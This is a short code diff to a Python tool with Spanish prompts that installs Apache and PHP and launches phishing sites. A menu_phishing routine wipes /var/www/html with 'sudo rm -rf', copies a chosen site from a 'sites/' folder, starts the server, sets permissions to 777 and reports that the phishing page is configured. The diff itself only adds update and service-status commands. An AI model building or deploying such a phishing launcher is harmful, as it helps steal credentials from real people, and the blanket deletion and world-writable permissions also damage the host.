@@ -29,7 +29,7 @@ try:
         if int(input("Ingresa tu opción: ")) == 1:
             os.system(".\\scripts\\install_windows.bat")
         else:
-            os.system("sudo apt install apache2 -y && apt install php")
+            os.system("sudo apt update -y && sudo apt install apache2 -y && apt install php -y")
         main()
 
     def menu_phishing():
@@ -60,7 +60,7 @@ try:
         print("Iniciando el servidor...")
         os.system("sudo rm -rf /var/www/html/*")  
         os.system(f"sudo cp -r sites/{carpeta}/* /var/www/html/")
-        os.system("sudo systemctl start apache2")
+        os.system("sudo systemctl start apache2 && service apache2 start && service apache2 status")
         os.system("sudo chmod 777 /var/www/html/* && sudo chmod 777 /var/www/html/")
 
         print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
